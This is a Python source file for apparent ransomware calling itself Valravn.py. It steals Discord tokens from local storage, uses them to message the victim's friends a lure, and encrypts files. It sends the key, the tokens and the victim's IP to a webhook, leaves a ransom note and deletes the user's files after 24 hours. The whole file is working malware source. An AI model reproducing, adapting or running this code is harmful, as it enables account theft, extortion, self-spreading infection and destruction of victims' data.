import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
import time
import threading
from pathlib import Path
import discord
from discord.ext import commands
import asyncio

user = str(os.environ["USERNAME"])
path1 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"
path2 = "C:\\Users\\" + user +"\\\\AppData\\\\Roaming\\\\discordcanary\\\\Local Storage\\\\leveldb"
path3 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discordptb\\\\Local Storage\\\\leveldb"
key = Fernet.generate_key()

def timer():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    print("timer started")
    time.sleep(86400)
    for file in my_path.glob("**/*.*"):
        os.system("del " + file + " /s /f /q")


def find_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "yourname" 
    ip = requests.get('https://api.ipify.org').text
    url = "webhook"  
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) + "\nDiscord token: " + str(find_tokens(path="C:\\\\Users\\\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"))
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("ransom.txt", "w")
    f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back! You have 24 hours to contact me, after that, all your files will be deleted")
    f.close()
    subprocess.call(r"notepad ransom.txt", shell=False)


def main():
    path1 = "C:\\\\Users\\\\" + user + "\\\\Desktop\\\\test"
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypthtread = threading.Thread(target=crypt, args=[file])
        crypthtread.start()
    warnthread = threading.Thread(target=warn)
    warnthread.start()
    timerthread = threading.Thread(target=timer)
    timerthread.start()

prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)
@bot.event
async def on_ready():
    for user in bot.user.friends:
        await user.send("Try this new game!")
    main()

if os.path.isdir(path1):
    for token in find_tokens(path1):
        try:
            bot.run(token, bot=False)
        except Exception as e:
            print("Wrong token, trying again...")

if os.path.isdir(path2):
    for token in find_tokens(path2):
        try:
            bot.run(token, bot=False)
        except Exception as e:
            print("Wrong token, trying again...")

if os.path.isdir(path3):
    for token in find_tokens(path3):
        try:
            bot.run(token, bot=False)
        except Exception as e:
            print("Wrong token, trying again...")
